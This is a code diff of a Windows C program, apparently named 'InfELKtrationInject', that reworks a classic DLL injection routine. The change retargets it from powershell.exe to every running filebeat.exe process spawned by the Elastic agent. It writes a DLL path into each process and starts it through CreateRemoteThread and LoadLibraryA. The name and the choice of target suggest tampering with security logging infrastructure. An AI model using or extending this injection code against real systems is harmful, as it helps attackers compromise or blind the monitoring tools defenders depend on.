@@ -25,11 +25,13 @@ int main()
 BOOL inject_dll() {
     HANDLE hSnapshot, hProcess;
     PROCESSENTRY32 processEntry;
-    //TCHAR targetProcess[MAX_PATH] = TEXT("elastic-agent.exe");
-    TCHAR targetProcess[MAX_PATH] = TEXT("powershell.exe");
+    TCHAR targetProcess[MAX_PATH] = TEXT("filebeat.exe");
+    //TCHAR targetProcess[MAX_PATH] = TEXT("powershell.exe");
     TCHAR targetDll[MAX_PATH] = TEXT("KERNEL32.DLL");
     CHAR dllFilename[DLL_FILEPATH_MAX_LENGTH] = "C:\\Users\\Administrator\\source\\repos\\InfELKtrationInject\\x64\\Debug\\InfELKtrationInjectLib.dll";
     DWORD targetPid = 0;
+    DWORD targetPids[5] = { 0 };
+    DWORD targetPidCount = 0;
     LPVOID szDllFilepath;
     DWORD_PTR target_kernel32_base;
     HMODULE hKernel32_self;
@@ -56,51 +58,58 @@ BOOL inject_dll() {
     do {
         if (CompareStringOrdinal(targetProcess, -1, processEntry.szExeFile, -1, false) == CSTR_EQUAL) {
             wprintf(L"found target process %s (pid=%d)\n", targetProcess, processEntry.th32ProcessID);
-            targetPid = processEntry.th32ProcessID;
-            break;
+            targetPids[targetPidCount++] = processEntry.th32ProcessID;
         }
     } while (Process32Next(hSnapshot, &processEntry));
 
     CloseHandle(hSnapshot);
 
-    if (!targetPid) {
+    if (!targetPids[0]) {
         _tprintf(TEXT("failed to find target process %s\n"), targetProcess);
         return false;
     }
 
-    // open handle to target process
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
-    if (!hProcess) {
-        print_error("hProcess");
-        return false;
+    // elastic-agent.exe spawns two filebeat.exe processes
+    // we could probably just inject into the one with the lowest pid, but do both/all just in case
+    for (DWORD i = 0; i < targetPidCount; i++) {
+        targetPid = targetPids[i];
+
+        printf("injecting into pid %d\n", targetPid);
+    
+        // open handle to target process
+        hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
+        if (!hProcess) {
+            print_error("hProcess");
+            return false;
+        }
+    
+        printf("opened handle to target process: 0x%p\n", hProcess);
+    
+        // allocate memory for the dll filepath
+        szDllFilepath = VirtualAllocEx(hProcess, NULL, DLL_FILEPATH_MAX_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!szDllFilepath) {
+            print_error("VirtualAllocEx");
+            return false;
+        }
+    
+        printf("allocated mem for dll filepath: 0x%p\n", szDllFilepath);
+    
+        // write dll path into target process
+        if (!WriteProcessMemory(hProcess, szDllFilepath, dllFilename, DLL_FILEPATH_MAX_LENGTH, NULL)) {
+            print_error("WriteProcessMemory");
+            return false;
+        }
+    
+        puts("copied dll path into target process");
+    
+        loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32"), "LoadLibraryA");
+        CreateRemoteThread(hProcess, NULL, NULL, loadLibrary, szDllFilepath, NULL, NULL);
+    
+        puts("executed DLL in target process");
+    
+        //VirtualFreeEx(hProcess, (LPVOID)szDllFilepath, 0, MEM_RELEASE); // this will crash the process, i haven't a clue why
+        CloseHandle(hProcess);
     }
-
-    printf("opened handle to target process: 0x%p\n", hProcess);
-
-    // allocate memory for the dll filepath
-    szDllFilepath = VirtualAllocEx(hProcess, NULL, DLL_FILEPATH_MAX_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!szDllFilepath) {
-        print_error("VirtualAllocEx");
-        return false;
-    }
-
-    printf("allocated mem for dll filepath: 0x%p\n", szDllFilepath);
-
-    // write dll path into target process
-    if (!WriteProcessMemory(hProcess, szDllFilepath, dllFilename, DLL_FILEPATH_MAX_LENGTH, NULL)) {
-        print_error("WriteProcessMemory");
-        return false;
-    }
-
-    puts("copied dll path into target process");
-
-    loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32"), "LoadLibraryA");
-    CreateRemoteThread(hProcess, NULL, NULL, loadLibrary, szDllFilepath, NULL, NULL);
-
-    puts("executed DLL in target process");
-
-    //VirtualFreeEx(hProcess, (LPVOID)szDllFilepath, 0, MEM_RELEASE); // this will crash the process, i haven't a clue why
-    CloseHandle(hProcess);
 
     return true;
 }
